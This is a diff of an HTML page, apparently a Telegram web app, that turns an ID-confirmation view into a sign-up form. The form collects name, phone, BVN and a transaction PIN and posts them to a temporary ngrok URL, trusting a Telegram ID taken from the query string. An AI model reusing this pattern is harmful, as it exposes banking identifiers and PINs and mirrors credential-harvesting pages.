@@ -74,26 +74,97 @@
 <body>
 <div class="container">
   <div class="header">
-    <h2 id="formTitle">Confirm Telegram ID</h2>
+    <h2 id="formTitle">Personal Info</h2>
+  </div>
+  <div class="progress-bar">
+    <div class="progress" id="progress"></div>
   </div>
 
   <div id="step1">
-    <input type="text" id="telegramUserId" placeholder="Your Telegram ID" readonly />
+    <input type="text" id="firstName" placeholder="First Name" required />
+    <input type="text" id="surname" placeholder="Surname" required />
+    <input type="text" id="phone" placeholder="Phone Number" required />
+    <input type="text" id="bvn" placeholder="BVN" required />
     <div class="error" id="step1Error"></div>
-    <button onclick="logTelegramInfo()">Confirm</button>
+    <button onclick="nextStep()">Next</button>
   </div>
+
+  <div id="step2" class="hidden">
+    <input type="password" id="pin" placeholder="Enter 4-digit PIN" maxlength="4" required />
+    <input type="password" id="confirmPin" placeholder="Retype PIN" maxlength="4" required />
+    <div class="error" id="step2Error"></div>
+    <button onclick="prevStep()">Back</button>
+    <button onclick="submitForm()">Sign Up</button>
+  </div>
+
+  <div id="message"></div>
 </div>
 
 <script>
-  const tg = window.Telegram?.WebApp || null;
-  if (tg) tg.expand();
+  const urlParams = new URLSearchParams(window.location.search);
+  const telegram_id = urlParams.get("tid");
 
-  const telegram_id = tg?.initDataUnsafe?.user?.id || null;
-  document.getElementById("telegramUserId").value = telegram_id || "No ID detected";
+  function nextStep() {
+    const firstName = document.getElementById("firstName").value;
+    const surname = document.getElementById("surname").value;
+    const phone = document.getElementById("phone").value;
+    const bvn = document.getElementById("bvn").value;
 
-  function logTelegramInfo() {
-    console.log("Telegram ID:", telegram_id);
-    alert("Telegram ID: " + telegram_id);
+    if (!firstName || !surname || !phone || !bvn) {
+      document.getElementById("step1Error").innerText = "Please fill all fields.";
+      return;
+    }
+
+    document.getElementById("step1Error").innerText = "";
+    document.getElementById("step1").classList.add("hidden");
+    document.getElementById("step2").classList.remove("hidden");
+    document.getElementById("formTitle").innerText = "Set Transaction PIN";
+    document.getElementById("progress").style.width = "100%";
+  }
+
+  function prevStep() {
+    document.getElementById("step2").classList.add("hidden");
+    document.getElementById("step1").classList.remove("hidden");
+    document.getElementById("formTitle").innerText = "Personal Info";
+    document.getElementById("progress").style.width = "50%";
+  }
+
+  async function submitForm() {
+    console.log("Submitting form...");
+
+    const firstName = document.getElementById("firstName").value;
+    const surname = document.getElementById("surname").value;
+    const phone = document.getElementById("phone").value;
+    const bvn = document.getElementById("bvn").value;
+    const pin = document.getElementById("pin").value;
+    const confirmPin = document.getElementById("confirmPin").value;
+
+    if (!pin || pin.length !== 4 || pin !== confirmPin) {
+      document.getElementById("step2Error").innerText = "PINs must match and be 4 digits.";
+      return;
+    }
+
+    try {
+      const res = await fetch("https://575595160557.ngrok-free.app/register", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          first_name: firstName,
+          surname: surname,
+          phone: phone,
+          bvn: bvn,
+          telegram_id: parseInt(telegram_id),
+          pin: pin
+        })
+      });
+
+      const result = await res.json();
+      document.getElementById("step2").classList.add("hidden");
+      document.getElementById("message").innerText = result.message || "Registered successfully!";
+    } catch (error) {
+      console.error("Submission failed:", error);
+      document.getElementById("message").innerText = "Something went wrong. Please try again.";
+    }
   }
 </script>
 </body>
